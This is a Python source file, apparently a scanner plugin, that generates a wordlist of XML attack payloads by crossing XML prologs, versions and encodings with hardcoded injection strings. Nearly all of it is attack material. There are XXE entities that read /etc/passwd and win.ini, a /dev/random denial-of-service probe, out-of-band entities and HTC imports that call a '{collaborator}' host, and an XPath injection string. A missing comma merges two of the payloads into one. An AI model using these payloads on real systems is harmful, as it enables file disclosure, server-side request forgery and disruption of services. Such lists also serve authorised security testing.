# TODO
# - add more error-based
# - add more payload types beyond these

payloads = [
        '{as_is}&foo;',
        r'{as_is}%foo;',
        '{as_is}<test></test>',
        '{as_is}<![CDATA[<test></test>]]>',
        '{as_is}count(/child::node())',
        '{as_is}<foo><![CDATA[\' or 1=1 or \'\'=\']]></foo>'
        '<!DOCTYPE a [<!ENTITY test "testtestxxe123">]><methodCall><methodName>&test;</methodName></methodCall>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://{collaborator}/xxe" >]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://{collaborator}/xxe" >]><foo>&xxe;</foo>',
        '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>',
        '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:////dev/random"> %xxe; ]>',
        '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini"> %xxe; ]>',
        '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://{collaborator}"> %xxe; ]>',
        '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://{collaborator}"> %xxe; ]>',
        '<HTML xmlns:test1><?import namespace="test1" implementation="http://{collaborator}/xxe.htc">',
        '<HTML xmlns:test1><?import namespace="test1" implementation="https://{collaborator}/xxe.htc">'
    ]

xmlPrologs = [
    '',
    '<?xml version="{version}"?>',
    '<?xml version="{version}" encoding="{encoding}"?>',
    '<?xml version="{version}" encoding="{encoding}" standalone="yes"?>',
    '<?xml version="{version}" encoding="{encoding}" standalone="no"?>'
]

xmlVersions = [
    '1.0',
    '1.1'
]

xmlEncodings = [
    'UTF-8',
    'ISO-8859-1'
]


def generate():
    wordlist = []

    # create wordlists
    for xmlProlog in xmlPrologs:
        for xmlVersion in xmlVersions:
            for xmlEncoding in xmlEncodings:
                for payload in payloads:
                    if '{as_is}' in payload:
                        word = payload.replace('{as_is}', '')
                        wordlist.append(word)
                    
                    if '{as_is}' not in payload:
                        word = xmlProlog + payload
                        word = word.replace('{version}', xmlVersion).replace('{encoding}', xmlEncoding)
                        wordlist.append(word)

    wordlist = list(set(wordlist))
    return wordlist
